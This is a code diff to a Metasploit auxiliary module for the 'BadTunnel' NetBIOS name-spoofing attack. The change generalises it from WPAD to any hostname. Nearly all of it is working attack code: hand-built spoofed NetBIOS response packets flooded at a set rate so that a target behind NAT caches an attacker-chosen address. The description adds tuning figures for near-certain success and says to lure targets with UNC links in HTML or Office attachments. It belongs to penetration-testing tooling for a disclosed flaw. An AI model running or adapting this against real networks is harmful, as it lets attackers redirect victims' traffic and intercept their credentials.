@@ -13,9 +13,16 @@ class MetasploitModule < Msf::Auxiliary
       'Name'        => 'NetBIOS "BadTunnel" Service',
       'Description'    => %q{
           This module listens for a NetBIOS name request and then continuously spams
-        NetBIOS responses for the name "WPAD" to the requesting host and port. This
-        can cause a system behind a NAT gateway to cache a malicious address for the
-        "WPAD" hostname.
+        NetBIOS responses to a target for given hostname, causing the target to cache
+        a malicious address for this name. On high-speed networks, the PPSRATE value
+        should be increased to speed up this attack. As an example, a value of around
+        30,000 is almost 100% successful when spoofing a response for a 'WPAD' lookup.
+        Distant targets may require more time and lower rates for a successful attack.
+
+        This module works when the target is behind a NAT gateway, since the stream of
+        NetBIOS responses will keep the NAT mapping alive after the initial setup. To
+        trigger the initial NetBIOS request to the Metasploit system, force the target
+        to access a UNC link pointing to the same address (HTML, Office attachment, etc).
       },
       'Authors'     => [
         'hdm',       # Metasploit Module
@@ -38,15 +45,17 @@ class MetasploitModule < Msf::Auxiliary
         [
           'Service'
         ],
-      'DefaultAction'  => 'Service'
+      'DefaultAction'  => 'Service',
+      'DisclosureDate' => 'Jun 14 2016'
     )
 
     register_options(
       [
         OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
         OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 137 ]),
-        OptAddress.new('WPADHOST',  [ true, "The address that WPAD should resolve to", nil ]),
-        OptInt.new('PPSRATE',       [ true, "The rate at which to send NetBIOS replies", 1_000]),
+        OptString.new('NBNAME',     [ true, "The NetBIOS name to spoof a reply for", 'WPAD' ]),
+        OptAddress.new('NBADDR',    [ true, "The address that the NetBIOS name should resolve to", Rex::Socket.source_address("50.50.50.50") ]),
+        OptInt.new('PPSRATE',       [ true, "The rate at which to send NetBIOS replies", 1_000])
       ], self.class)
   end
 
@@ -61,8 +70,9 @@ class MetasploitModule < Msf::Auxiliary
     @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
     @sock.bind(datastore['SRVHOST'], @port)
 
-    @wpad_host = datastore['WPADHOST']
-    @targ_rate = datastore['PPSRATE'].to_i
+    @targ_rate = datastore['PPSRATE']
+    @fake_name = datastore['NBNAME']
+    @fake_addr = datastore['NBADDR']
 
     print_status("BadTunnel: Listening for NetBIOS requests...")
 
@@ -78,6 +88,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status("BadTunnel:  >> Received a NetBIOS request from #{@targ_addr}:#{@targ_port}")
       @sock.connect(@targ_addr, @targ_port)
+
       netbios_spam
 
     rescue ::Interrupt
@@ -90,14 +101,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def netbios_spam
-    payload = ["FFFF85000000000100000000204648464145424545434143414341434143414341434143414341434143414141000020000100FFFFFF000600000FFFFFFFF"].pack("H*")
-    payload[58,4] = Rex::Socket.addr_aton(@wpad_host)
+    payload =
+      "\xff\xff" + # TXID
+      "\x85\x00\x00\x00\x00\x01\x00\x00\x00\x00\x20" +
+      Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack("A15") + "\x00" ) +
+      "\x00\x00\x20\x00\x01\x00\xff\xff\xff\x00\x06\x00\x00" +
+      Rex::Socket.addr_aton(@fake_addr)
 
     stime = Time.now.to_f
     pcnt = 0
     pps  = 0
 
-    print_status("BadTunnel:  >> Spamming WPAD responses to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")
+    print_status("BadTunnel:  >> Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")
 
     live = true
     while live
